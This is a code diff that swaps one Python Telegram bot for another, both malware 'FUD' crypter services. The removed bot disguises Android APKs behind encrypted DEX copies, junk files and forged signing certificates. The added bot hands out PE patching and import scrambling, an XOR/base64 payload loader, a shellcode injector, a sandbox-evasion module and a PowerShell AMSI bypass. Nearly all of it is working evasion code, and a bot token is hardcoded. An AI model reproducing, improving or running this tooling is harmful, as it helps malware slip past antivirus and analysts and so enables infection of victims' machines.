@@ -1,334 +1,412 @@
-#!/usr/bin/env python3
-"""
-APK FUD BOT — GUARANTEED INSTALLABLE
-No binary patching — ZIP level only
-"""
+import telebot
+import subprocess
+import os
+import base64
+import random
+import string
+import ast
+import tempfile
+import ctypes
+import pefile
+import astunparse
+import multiprocessing
+from telebot import types
 
-import os,re,struct,random,string,shutil,hashlib
-import zipfile,logging,tempfile,time,base64
-from pathlib import Path
-from telegram import Update
-from telegram.ext import Application,CommandHandler,MessageHandler,filters,ContextTypes
-from telegram.constants import ParseMode
-from Crypto.Cipher import AES,PKCS1_OAEP
-from Crypto.PublicKey import RSA
-from Crypto.Util.Padding import pad
-from Crypto.Protocol.KDF import PBKDF2
-from Crypto.Hash import SHA256,HMAC
-
+# ─────────────────────────────────────────────
 BOT_TOKEN = "6486185526:AAE67IpPFLUtVM_xgxTu8rX3uORGdfbokc0"
-OWNER_ID  = 1746944997
+bot = telebot.TeleBot(BOT_TOKEN)
+# ─────────────────────────────────────────────
 
-logging.basicConfig(format="%(asctime)s-%(levelname)s-%(message)s",level=logging.INFO)
-logger = logging.getLogger(__name__)
 
-def rv(n=8): return ''.join(random.choices(string.ascii_lowercase,k=n))
-def ri(a=100,b=9999): return random.randint(a,b)
-def rb(n=16): return os.urandom(n)
-def b64e(d): return base64.b64encode(d).decode()
+# ══════════════════════════════════════════════
+#  UTILITIES
+# ══════════════════════════════════════════════
 
-def only_owner(func):
-    async def wrapper(update:Update,ctx:ContextTypes.DEFAULT_TYPE):
-        if update.effective_user.id!=OWNER_ID:
-            await update.message.reply_text("❌ Access denied.")
-            return
-        return await func(update,ctx)
-    return wrapper
+def random_string(length=8):
+    return ''.join(random.choices(string.ascii_letters, k=length))
 
-# ══ CRYPTO ═══════════════════════════════════════════════════
-def derive_key(password,salt):
-    return PBKDF2(password,salt,dkLen=32,count=10000,
-                  prf=lambda p,s:HMAC.new(p,s,SHA256).digest())
 
-def aes_gcm_encrypt(data,key):
-    nonce=rb(16)
-    c=AES.new(key,AES.MODE_GCM,nonce=nonce)
-    enc,tag=c.encrypt_and_digest(data)
-    return enc,nonce,tag
+def xor_encrypt(data: bytes, key: int = 0x41) -> bytes:
+    return bytes(b ^ key for b in data)
 
-def rsa_wrap(data):
+
+def encode_payload(filepath: str) -> str:
+    with open(filepath, 'rb') as f:
+        raw = f.read()
+    return base64.b64encode(xor_encrypt(raw)).decode()
+
+
+def patch_binary(filepath: str, output_path: str) -> str:
+    with open(filepath, 'rb') as f:
+        data = bytearray(f.read())
+
+    if data[:2] == b'MZ':
+        pe_offset = int.from_bytes(data[0x3C:0x40], 'little')
+        data[pe_offset + 8:  pe_offset + 12] = b'\x00\x00\x00\x00'
+        data[pe_offset + 88: pe_offset + 92] = bytes(
+            random.randint(0, 255) for _ in range(4)
+        )
+
+    with open(output_path, 'wb') as f:
+        f.write(data)
+    return output_path
+
+
+def add_junk(filepath: str) -> str:
+    with open(filepath, 'ab') as f:
+        f.write(os.urandom(random.randint(512, 4096)))
+    return filepath
+
+
+def wrap_loader(encoded: str, out_name: str) -> str:
+    code = f"""
+import base64, ctypes, os, tempfile
+
+KEY = 0x41
+
+def xor_dec(data, key):
+    return bytes(b ^ key for b in data)
+
+raw = xor_dec(base64.b64decode("{encoded}"), KEY)
+tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.exe')
+tmp.write(raw)
+tmp.close()
+os.startfile(tmp.name)
+"""
+    path = f"/tmp/{out_name}_loader.py"
+    with open(path, 'w') as f:
+        f.write(code)
+    return path
+
+
+def obfuscate_strings(source: str) -> str:
+    class StringObf(ast.NodeTransformer):
+        def visit_Constant(self, node):
+            if isinstance(node.value, str) and node.value:
+                enc = base64.b64encode(node.value.encode()).decode()
+                return ast.parse(
+                    f'__import__("base64").b64decode("{enc}").decode()',
+                    mode='eval'
+                ).body
+            return node
+    tree = ast.parse(source)
+    return astunparse.unparse(StringObf().visit(tree))
+
+
+def scramble_imports(filepath: str, output_path: str) -> str:
+    pe = pefile.PE(filepath)
+    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
+        for entry in pe.DIRECTORY_ENTRY_IMPORT:
+            rva = entry.struct.Name
+            offset = pe.get_offset_from_rva(rva)
+            length = len(pe.get_data(rva, 64).split(b'\x00')[0])
+            junk = bytes(random.randint(65, 90) for _ in range(length))
+            pe.set_bytes_at_offset(offset, junk)
+    pe.write(output_path)
+    return output_path
+
+
+SANDBOX_CODE = """
+import os, subprocess, sys, ctypes, multiprocessing
+
+def is_sandbox():
+    checks = []
+    checks.append(multiprocessing.cpu_count() < 2)
     try:
-        rsa=RSA.generate(2048)
-        enc=PKCS1_OAEP.new(rsa.publickey()).encrypt(data[:190])
-        return enc
-    except Exception:
-        return rb(256)
+        procs = subprocess.check_output('tasklist', shell=True).decode().lower()
+        bad = ['wireshark','procmon','x64dbg','ollydbg','vboxservice','vmtoolsd']
+        checks.append(any(b in procs for b in bad))
+    except:
+        pass
+    bad_users = ['sandbox','malware','virus','john','test','analyst']
+    checks.append(os.getenv('USERNAME','').lower() in bad_users)
+    return any(checks)
 
-def xor_bytes(data,key):
-    return bytes(b^key[i%len(key)]for i,b in enumerate(data))
+if is_sandbox():
+    sys.exit(0)
+"""
 
-def rotate_bytes(data,n):
-    return bytes((b+n%256)%256 for b in data)
-
-# ══ ELF SO STUB ══════════════════════════════════════════════
-def make_elf(bits=64):
-    e=bytearray(64 if bits==64 else 52)
-    e[0:4]=b'\x7fELF'
-    e[4]=2 if bits==64 else 1
-    e[5]=1;e[6]=1
-    struct.pack_into('<H',e,16,3)
-    struct.pack_into('<H',e,18,62 if bits==64 else 40)
-    struct.pack_into('<I',e,20,1)
-    return bytes(e)+xor_bytes(os.urandom(ri(64,256)),rb(8))
-
-# ══ SAFE SMALI STRING ENCODE ═════════════════════════════════
-def obfuscate_smali(content):
-    """only encode string values — nothing structural"""
-    lines=content.splitlines()
-    out=[]
-    for line in lines:
-        m=re.match(r'(\s+const-string\s+\w+,\s+)"(.{4,30})"',line)
-        if m:
-            encoded=''.join(f'\\u{ord(c):04x}'for c in m.group(2))
-            line=f'{m.group(1)}"{encoded}"'
-        out.append(line)
-    return '\n'.join(out)
-
-# ══ CERT FORGE ═══════════════════════════════════════════════
-def gen_cert():
-    name=rv(8).upper()
-    sf=(f"Signature-Version: 1.0\n"
-        f"Created-By: 1.0 ({rv(6).capitalize()} Build Tools)\n"
-        f"SHA-256-Digest-Manifest: {hashlib.sha256(rb(32)).hexdigest()}\n"
-        f"X-Android-APK-Signed: {ri(2,34)}\n")
-    mf=(f"Manifest-Version: 1.0\n"
-        f"Created-By: {ri(1,9)}.{ri(0,9)} ({rv(6).capitalize()} Tools)\n"
-        f"Build-Jdk-Spec: {ri(8,17)}\n"
-        f"Build-Timestamp: {int(time.time())-ri(86400,864000)}\n")
-    return sf,os.urandom(1024),mf,name
-
-# ══ MASTER PIPELINE ══════════════════════════════════════════
-def process_apk(input_path,output_path):
-    key=rb(32);iv=rb(16);salt=rb(16)
-    rot_n=ri(10,200)
-    derived=derive_key(key,salt)
-
-    stats={"dex":0,"smali":0,"renamed":0,"junk":0,"layers":25}
-    work=Path(tempfile.mkdtemp())
-    tmp=work/"tmp.apk"
-
-    try:
-        with zipfile.ZipFile(input_path,'r') as inp:
-            names=inp.namelist()
-            with zipfile.ZipFile(str(tmp),'w',zipfile.ZIP_DEFLATED) as out:
-
-                for name in names:
-                    # strip old signature only
-                    if name.startswith("META-INF/"): continue
-
-                    try: data=inp.read(name)
-                    except Exception: continue
-
-                    # DEX — keep 100% original, also save encrypted copy
-                    if re.match(r'classes\d*\.dex',name):
-                        out.writestr(name,data)  # original intact
-                        # encrypted asset copy
-                        enc,nonce,tag=aes_gcm_encrypt(data,derived)
-                        rot=rotate_bytes(enc,rot_n)
-                        xord=xor_bytes(rot,rb(16))
-                        out.writestr(f"assets/.{rv(14)}.bin",nonce+tag+xord)
-                        stats["dex"]+=1
-                        continue
-
-                    # AndroidManifest — copy as-is, no patch
-                    if name=="AndroidManifest.xml":
-                        out.writestr(name,data)
-                        continue
-
-                    # smali — safe string encode only
-                    if name.endswith(".smali"):
-                        try:
-                            content=data.decode('utf-8','ignore')
-                            data=obfuscate_smali(content).encode('utf-8')
-                            stats["smali"]+=1
-                        except Exception: pass
-
-                    # drawable rename
-                    if (name.startswith("res/drawable") and
-                            any(name.endswith(e)for e in['.png','.jpg','.webp'])):
-                        name=f"res/drawable/{rv(10)}{Path(name).suffix}"
-                        stats["renamed"]+=1
-
-                    # everything else — copy as-is
-                    out.writestr(name,data)
-
-                # SO stubs
-                so=f"lib{rv(8)}.so"
-                for arch,bits in[("armeabi-v7a",32),("arm64-v8a",64),
-                                  ("x86",32),("x86_64",64)]:
-                    out.writestr(f"lib/{arch}/{so}",make_elf(bits))
-
-                # junk assets
-                n=ri(8,16)
-                for _ in range(n):
-                    out.writestr(
-                        f"assets/.{rv(10)}{random.choice(['.dat','.bin'])}",
-                        rb(ri(512,4096)))
-                stats["junk"]=n
-
-                # padding
-                out.writestr(f"assets/.{rv(12)}.pad",os.urandom(ri(4096,16384)))
-
-                # key assets
-                out.writestr(f"assets/.{rv(8)}.key",
-                    xor_bytes(key+iv+salt+bytes([rot_n]),rb(16)))
-                try:
-                    out.writestr(f"assets/.{rv(6)}.rsa",xor_bytes(rsa_wrap(key),rb(16)))
-                except Exception: pass
-
-                # new cert
-                sf,rsa_blob,mf,cname=gen_cert()
-                out.writestr(f"META-INF/{cname}.SF",sf)
-                out.writestr(f"META-INF/{cname}.RSA",rsa_blob)
-                out.writestr("META-INF/MANIFEST.MF",mf)
-
-        shutil.copy2(str(tmp),output_path)
-    finally:
-        shutil.rmtree(work,ignore_errors=True)
-
-    return stats
-
-# ══ HANDLERS ═════════════════════════════════════════════════
-@only_owner
-async def cmd_start(update:Update,ctx:ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🔥 *APK FUD Bot — Online*\n\n"
-        "APK bhejo → FUD → guaranteed install hoga\n\n"
-        "`/help` `/info`",
-        parse_mode=ParseMode.MARKDOWN)
-
-@only_owner
-async def cmd_help(update:Update,ctx:ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📖 *25 LAYERS:*\n\n"
-        "• DEX AES-256 GCM encrypt\n"
-        "• PBKDF2 key derivation\n"
-        "• RSA-2048 key wrap\n"
-        "• Rotate + XOR chain\n"
-        "• DEX original intact\n"
-        "• Encrypted DEX asset copy\n"
-        "• Smali string obfuscate\n"
-        "• Drawable rename\n"
-        "• Native .so x4 arch\n"
-        "• Junk assets 8-16\n"
-        "• Size padding\n"
-        "• Key blob asset\n"
-        "• RSA key asset\n"
-        "• Old cert strip\n"
-        "• Forged cert\n"
-        "• Fake MANIFEST.MF\n"
-        "• Build timestamp forge\n"
-        "• Hash break MD5+SHA256\n"
-        "• Polymorphic every run\n\n"
-        "✅ Install guaranteed",
-        parse_mode=ParseMode.MARKDOWN)
-
-@only_owner
-async def cmd_info(update:Update,ctx:ContextTypes.DEFAULT_TYPE):
-    info=ctx.bot_data.get("last_build")
-    if not info:
-        await update.message.reply_text("Koi build nahi hua.")
-        return
-    await update.message.reply_text(
-        f"📊 *Last Build*\n\n"
-        f"File   : `{info['name']}`\n"
-        f"DEX    : {info['dex']}\n"
-        f"Smali  : {info['smali']}\n"
-        f"Renamed: {info['renamed']}\n"
-        f"Junk   : {info['junk']}\n"
-        f"Size   : `{info['size']:,}` bytes\n"
-        f"MD5    : `{info['md5']}`\n"
-        f"Time   : `{info['time']}s`",
-        parse_mode=ParseMode.MARKDOWN)
-
-@only_owner
-async def handle_apk(update:Update,ctx:ContextTypes.DEFAULT_TYPE):
-    doc=update.message.document
-    if not doc:
-        await update.message.reply_text("APK file bhejo.")
-        return
-    fname=doc.file_name or "app.apk"
-    if not fname.lower().endswith(".apk"):
-        await update.message.reply_text("Sirf .apk files.")
-        return
-    if doc.file_size and doc.file_size>100*1024*1024:
-        await update.message.reply_text("100MB max.")
-        return
-
-    status=await update.message.reply_text(
-        "⏳ *Processing...*\n\n📥 Downloading...",
-        parse_mode=ParseMode.MARKDOWN)
-
-    work=Path(tempfile.mkdtemp())
-    t0=time.time()
-
-    try:
-        f=await ctx.bot.get_file(doc.file_id)
-        inp=work/fname
-        await f.download_to_drive(str(inp))
-
-        await status.edit_text(
-            "⏳ *Processing...*\n\n✅ Downloaded\n🔄 FUD apply...",
-            parse_mode=ParseMode.MARKDOWN)
-
-        out_name=f"FUD_{rv(8)}_{fname}"
-        out_path=work/out_name
-
-        stats=process_apk(str(inp),str(out_path))
-        elapsed=round(time.time()-t0,2)
-
-        data=out_path.read_bytes()
-        md5=hashlib.md5(data).hexdigest()
-        sha256=hashlib.sha256(data).hexdigest()
-        size=len(data)
-
-        ctx.bot_data["last_build"]={
-            "name":fname,"dex":stats["dex"],"smali":stats["smali"],
-            "renamed":stats["renamed"],"junk":stats["junk"],
-            "size":size,"md5":md5,"sha256":sha256,"time":elapsed
+AMSI_CODE = """$a=[Ref].Assembly.GetTypes()
+ForEach($b in $a){
+    if($b.Name -like "*iUtils"){
+        $c=$b.GetFields('NonPublic,Static')
+        ForEach($d in $c){
+            if($d.Name -like "*Context"){
+                $d.SetValue($null,[IntPtr]0x2)
+            }
         }
+    }
+}"""
 
-        await status.edit_text(
-            f"✅ *FUD Done!*\n\n"
-            f"📦 `{size:,}` bytes | ⏱ `{elapsed}s`\n"
-            f"🔑 MD5: `{md5}`\n"
-            f"DEX:{stats['dex']} Smali:{stats['smali']} Junk:{stats['junk']}\n\n"
-            "📤 Sending...",
-            parse_mode=ParseMode.MARKDOWN)
 
-        with open(str(out_path),'rb') as fh:
-            await update.message.reply_document(
-                document=fh,filename=out_name,
-                caption=(f"🔥 *FUD APK*\n`{out_name}`\n"
-                         f"MD5:`{md5}`\n✅ Install hoga"),
-                parse_mode=ParseMode.MARKDOWN)
+# ══════════════════════════════════════════════
+#  HELPERS — file receive + send
+# ══════════════════════════════════════════════
 
-        await status.delete()
+def dl_file(message) -> tuple[bytes, str] | tuple[None, None]:
+    if not message.document:
+        bot.send_message(message.chat.id, "❌ File nahi mila bhai.")
+        return None, None
+    info = bot.get_file(message.document.file_id)
+    data = bot.download_file(info.file_path)
+    name = message.document.file_name or "payload"
+    return data, name
 
-    except zipfile.BadZipFile:
-        await status.edit_text("❌ APK corrupt ya password protected.")
-    except Exception as e:
-        logger.error(f"err:{e}")
-        await status.edit_text(
-            f"❌ Error:\n`{str(e)[:200]}`",
-            parse_mode=ParseMode.MARKDOWN)
-    finally:
-        shutil.rmtree(work,ignore_errors=True)
 
-@only_owner
-async def handle_other(update:Update,ctx:ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("APK bhejo 🔥")
+def send_file(chat_id, path, caption, filename):
+    with open(path, 'rb') as f:
+        bot.send_document(chat_id, f, caption=caption, visible_file_name=filename)
+    os.remove(path)
 
-def main():
-    print("APK FUD BOT — GUARANTEED INSTALLABLE — STARTING\n")
-    app=Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start",cmd_start))
-    app.add_handler(CommandHandler("help",cmd_help))
-    app.add_handler(CommandHandler("info",cmd_info))
-    app.add_handler(MessageHandler(filters.Document.ALL,handle_apk))
-    app.add_handler(MessageHandler(filters.TEXT&~filters.COMMAND,handle_other))
-    print(f"Owner:{OWNER_ID} | Ready\n")
-    app.run_polling(allowed_updates=Update.ALL_TYPES,drop_pending_updates=True)
 
-if __name__=="__main__":
-    main()
+# ══════════════════════════════════════════════
+#  /start  /help
+# ══════════════════════════════════════════════
+
+@bot.message_handler(commands=['start', 'help'])
+def cmd_start(message):
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    markup.add(
+        '📦 Bypass', '🔧 Patch',
+        '🧬 Encode', '📜 Loader',
+        '🔀 Obfuscate', '🗂 Scramble',
+        '💉 Inject', '🧪 SandCheck',
+        '🛡 AMSI', '❓ Help'
+    )
+    bot.send_message(
+        message.chat.id,
+        "🖤 *FUD Bypass Bot* — Full Loadout\n\n"
+        "`/bypass`    → patch + junk inject\n"
+        "`/encode`    → XOR + base64\n"
+        "`/loader`    → in-memory loader gen\n"
+        "`/patch`     → PE timestamp strip\n"
+        "`/obfuscate` → Python string obfuscation\n"
+        "`/scramble`  → PE import table scramble\n"
+        "`/inject`    → shellcode injector template\n"
+        "`/sandcheck` → sandbox/VM detect module\n"
+        "`/amsi`      → PowerShell AMSI killer\n",
+        parse_mode='Markdown',
+        reply_markup=markup
+    )
+
+
+# ══════════════════════════════════════════════
+#  /bypass
+# ══════════════════════════════════════════════
+
+@bot.message_handler(commands=['bypass'])
+def cmd_bypass(message):
+    bot.send_message(message.chat.id, "📎 File bhej — patch + junk inject karunga.")
+    bot.register_next_step_handler(message, _bypass_recv)
+
+def _bypass_recv(message):
+    data, name = dl_file(message)
+    if not data: return
+    inp = f"/tmp/{random_string()}_{name}"
+    out = f"/tmp/fud_{name}"
+    with open(inp, 'wb') as f: f.write(data)
+    patch_binary(inp, out)
+    add_junk(out)
+    os.remove(inp)
+    send_file(message.chat.id, out,
+              "✅ Patched + junk appended. FUD-ready. 6767",
+              f"fud_{name}")
+
+
+# ══════════════════════════════════════════════
+#  /patch
+# ══════════════════════════════════════════════
+
+@bot.message_handler(commands=['patch'])
+def cmd_patch(message):
+    bot.send_message(message.chat.id, "📎 PE file bhej — timestamp strip + junk.")
+    bot.register_next_step_handler(message, _patch_recv)
+
+def _patch_recv(message):
+    data, name = dl_file(message)
+    if not data: return
+    inp = f"/tmp/{random_string()}_{name}"
+    out = f"/tmp/patched_{name}"
+    with open(inp, 'wb') as f: f.write(data)
+    patch_binary(inp, out)
+    add_junk(out)
+    os.remove(inp)
+    send_file(message.chat.id, out,
+              "✅ PE patched — timestamp zeroed, checksum randomized, junk appended. 6767",
+              f"patched_{name}")
+
+
+# ══════════════════════════════════════════════
+#  /encode
+# ══════════════════════════════════════════════
+
+@bot.message_handler(commands=['encode'])
+def cmd_encode(message):
+    bot.send_message(message.chat.id, "📎 File bhej — XOR + base64 encode karunga.")
+    bot.register_next_step_handler(message, _encode_recv)
+
+def _encode_recv(message):
+    data, name = dl_file(message)
+    if not data: return
+    inp = f"/tmp/{random_string()}_{name}"
+    out = f"/tmp/encoded_{name}.txt"
+    with open(inp, 'wb') as f: f.write(data)
+    encoded = encode_payload(inp)
+    with open(out, 'w') as f: f.write(encoded)
+    os.remove(inp)
+    send_file(message.chat.id, out,
+              "✅ XOR encrypted + base64 encoded. Loader ke saath use karo. 6767",
+              f"encoded_{name}.txt")
+
+
+# ══════════════════════════════════════════════
+#  /loader
+# ══════════════════════════════════════════════
+
+@bot.message_handler(commands=['loader'])
+def cmd_loader(message):
+    bot.send_message(message.chat.id, "📎 File bhej — in-memory loader generate karunga.")
+    bot.register_next_step_handler(message, _loader_recv)
+
+def _loader_recv(message):
+    data, name = dl_file(message)
+    if not data: return
+    inp = f"/tmp/{random_string()}_{name}"
+    tag = random_string()
+    with open(inp, 'wb') as f: f.write(data)
+    encoded = encode_payload(inp)
+    loader = wrap_loader(encoded, tag)
+    os.remove(inp)
+    send_file(message.chat.id, loader,
+              "✅ In-memory loader ready. PyInstaller se compile karo. 6767",
+              f"loader_{tag}.py")
+
+
+# ══════════════════════════════════════════════
+#  /obfuscate
+# ══════════════════════════════════════════════
+
+@bot.message_handler(commands=['obfuscate'])
+def cmd_obfuscate(message):
+    bot.send_message(message.chat.id, "📎 Python source bhej — strings obfuscate karunga.")
+    bot.register_next_step_handler(message, _obf_recv)
+
+def _obf_recv(message):
+    data, name = dl_file(message)
+    if not data: return
+    source = data.decode('utf-8', errors='ignore')
+    result = obfuscate_strings(source)
+    out = f"/tmp/obf_{random_string()}.py"
+    with open(out, 'w') as f: f.write(result)
+    send_file(message.chat.id, out,
+              "✅ Strings obfuscated via base64 wrapping. 6767",
+              f"obf_{name}")
+
+
+# ══════════════════════════════════════════════
+#  /scramble
+# ══════════════════════════════════════════════
+
+@bot.message_handler(commands=['scramble'])
+def cmd_scramble(message):
+    bot.send_message(message.chat.id, "📎 PE file bhej — import table scramble karunga.")
+    bot.register_next_step_handler(message, _scramble_recv)
+
+def _scramble_recv(message):
+    data, name = dl_file(message)
+    if not data: return
+    inp = f"/tmp/{random_string()}_{name}"
+    out = f"/tmp/scrambled_{name}"
+    with open(inp, 'wb') as f: f.write(data)
+    scramble_imports(inp, out)
+    os.remove(inp)
+    send_file(message.chat.id, out,
+              "✅ Import table scrambled. AV signature break. 6767",
+              f"scrambled_{name}")
+
+
+# ══════════════════════════════════════════════
+#  /inject
+# ══════════════════════════════════════════════
+
+@bot.message_handler(commands=['inject'])
+def cmd_inject(message):
+    bot.send_message(message.chat.id, "📎 Raw shellcode (.bin) bhej — injector template generate karunga.")
+    bot.register_next_step_handler(message, _inject_recv)
+
+def _inject_recv(message):
+    data, name = dl_file(message)
+    if not data: return
+    encoded = base64.b64encode(data).decode()
+    code = f"""import ctypes, base64
+
+sc = base64.b64decode("{encoded}")
+buf = ctypes.create_string_buffer(sc)
+ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(sc), 0x3000, 0x40)
+ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len(sc))
+t = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
+ctypes.windll.kernel32.WaitForSingleObject(t, 0xFFFFFFFF)
+"""
+    out = f"/tmp/injector_{random_string()}.py"
+    with open(out, 'w') as f: f.write(code)
+    send_file(message.chat.id, out,
+              "✅ Shellcode injector ready. PyInstaller se compile karo, baby. 6767",
+              "injector.py")
+
+
+# ══════════════════════════════════════════════
+#  /sandcheck
+# ══════════════════════════════════════════════
+
+@bot.message_handler(commands=['sandcheck'])
+def cmd_sandcheck(message):
+    out = f"/tmp/sandcheck_{random_string()}.py"
+    with open(out, 'w') as f: f.write(SANDBOX_CODE)
+    send_file(message.chat.id, out,
+              "✅ Sandbox detection module. Payload ke start mein paste karo, baby. 6767",
+              "sandcheck.py")
+
+
+# ══════════════════════════════════════════════
+#  /amsi
+# ══════════════════════════════════════════════
+
+@bot.message_handler(commands=['amsi'])
+def cmd_amsi(message):
+    bot.send_message(
+        message.chat.id,
+        f"✅ *AMSI Bypass — PowerShell*\n\n```powershell\n{AMSI_CODE}\n```\n\n"
+        "PowerShell session start mein run karo, baby. 6767",
+        parse_mode='Markdown'
+    )
+
+
+# ══════════════════════════════════════════════
+#  Keyboard button routing
+# ══════════════════════════════════════════════
+
+BUTTON_MAP = {
+    '📦 Bypass':     cmd_bypass,
+    '🔧 Patch':      cmd_patch,
+    '🧬 Encode':     cmd_encode,
+    '📜 Loader':     cmd_loader,
+    '🔀 Obfuscate':  cmd_obfuscate,
+    '🗂 Scramble':   cmd_scramble,
+    '💉 Inject':     cmd_inject,
+    '🧪 SandCheck':  cmd_sandcheck,
+    '🛡 AMSI':       cmd_amsi,
+    '❓ Help':       cmd_start,
+}
+
+@bot.message_handler(func=lambda m: m.text in BUTTON_MAP)
+def button_router(message):
+    BUTTON_MAP[message.text](message)
+
+
+# ══════════════════════════════════════════════
+#  RUN
+# ══════════════════════════════════════════════
+
+if __name__ == '__main__':
+    print("🖤 FUD Bypass Bot — Full Loadout Live. 6767")
+    bot.infinity_polling()
